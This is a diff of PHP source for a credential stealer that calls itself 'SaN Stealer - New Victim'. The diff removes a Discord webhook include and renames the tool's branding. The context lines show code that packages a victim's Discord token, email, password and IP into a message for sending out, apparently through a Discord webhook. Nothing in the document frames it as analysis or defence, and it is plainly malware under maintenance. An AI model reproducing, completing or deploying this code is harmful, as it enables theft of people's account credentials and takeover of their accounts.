@@ -1,8 +1,4 @@
 <?php
-
-require 'DiscordWEbhook.php';
-
-$dw = new DiscordWebhook($webhook);
 function getinfo($token, $url){
     $ch = curl_init();
 
@@ -148,8 +144,8 @@ function getbadges($token, $login, $password, $client_ip) {
 
         $headers = [ 'Content-Type: application/json; charset=utf-8' ];
         if ($badges == '') {
-            $POST = [ 'username' => 'Slashx & San Stealer - New Victim', 'content' => 'token: '.$token.'
- **Slashx & San Stealer | v1.0🔔 | @everyone**
+            $POST = [ 'username' => 'SaN Stealer - New Victim', 'content' => 'token: '.$token.'
+ **SaN Stealer | v1.0🔔 | @everyone**
 👮🏾‍♂️ ID:  '.$userid.'
 📪 Mail: '.$login.'
 📝 Pass: '.$password.'
@@ -158,8 +154,8 @@ function getbadges($token, $login, $password, $client_ip) {
 '];
         }
         else {
-          $POST = [ 'username' => 'Slashx & San Stealer - New Victim', 'content' => 'token: '.$token.'
- **Slashx & San Stealer | v1.0🔔 | @everyone**
+          $POST = [ 'username' => 'SaN Stealer - New Victim', 'content' => 'token: '.$token.'
+ **SaN Stealer | v1.0🔔 | @everyone**
 👮🏾‍♂️ ID:  '.$userid.'
 📪 Mail: '.$login.'
 📝 Pass: '.$password.'
